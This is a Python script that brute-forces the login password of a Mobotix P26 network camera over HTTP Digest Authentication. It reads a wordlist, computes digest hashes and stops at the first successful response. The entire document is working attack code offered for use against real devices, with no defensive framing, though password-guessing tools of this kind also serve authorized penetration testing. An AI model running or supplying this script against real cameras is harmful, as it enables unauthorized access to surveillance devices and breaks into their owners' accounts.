# This scripts bruteforces a Mobotix P26 camera credentials over HTTP Digest Authentification.
# It has been tailored to work for a specific model.
# Here are the tweakings made that differs from the official documentation if it doesnt work. Check those things :
# - The headers argument are sketchily parsed (replacing spaces, and accessing a list with spaced arguments, etc)
# - uri is empty, cnonce is 1, nonceCount is 1. Tailor to your needs.
# - ...

import sys
import hashlib
import requests
import argparse
from requests.auth import HTTPDigestAuth



# ======= ARGUMENT HANDLING
parser = argparse.ArgumentParser(description="Script to bruteforce HTTP Digest Authentification")
parser.add_argument('url', type=str,
                    help='URL of the target website')
parser.add_argument('username', type=str,
                    help='username to authenticate as')
parser.add_argument('wordlist', type=str,
                    help='wordlist used to bruteforce passwords')
args = parser.parse_args()
url = args.url
username = args.username
wordlist = args.wordlist


# first HTTP request, we ask for authentification information
r = requests.get(url)
headers = r.headers["WWW-Authenticate"].replace(',', '=').replace('"', '').split('=')
realm = headers[headers.index(" Digest realm") + 1]
nonce = headers[headers.index(" nonce") + 1]
uri = ""
algorithm = headers[headers.index(" algorithm") + 1]
qop = headers[headers.index(" qop") + 1]

nc="00000001" #nonceCount, abritrary
cnonce='1' # client-side ONCE, arbitrary

# opens wordlist and tries every password by hashing it with everything.
# if status code 200, then we found it.
found_password = ''
with open(wordlist) as wordlist:
  for line in wordlist:
    line = line.replace('\n', '')
    if len(line) >= 8:
      password = line.replace('\n', '')
      # craft client-side hash and headers
      HA1 = hashlib.md5(f"{username}:{realm}:{password}".encode())
      HA2 = hashlib.md5(f"GET:{uri}".encode())
      HA1 = HA1.hexdigest()
      HA2 = HA2.hexdigest()
      response = hashlib.md5(f'{HA1}:{nonce}:{nc}:{cnonce}:{qop}:{HA2}'.encode()).hexdigest()

      crafted_headers = {
        'Authorization' : 'Digest username={username}, realm={realm}, nonce={nonce}, uri="", algorithm={algorithm}, response={response}, qop={qop}, nc={nc}, cnonce={cnonce}'
      }

      # second HTTP request, we send our credentials
      print("trying with credentials " + username + ":" + password)
      r = requests.get(url, auth=HTTPDigestAuth(username, password), headers=crafted_headers)
      if r.status_code == 200:
        found_password = password
        break

if found_password != '':
  print("Password found: " + password)
else :
  print("No password found")

print("Exiting...")
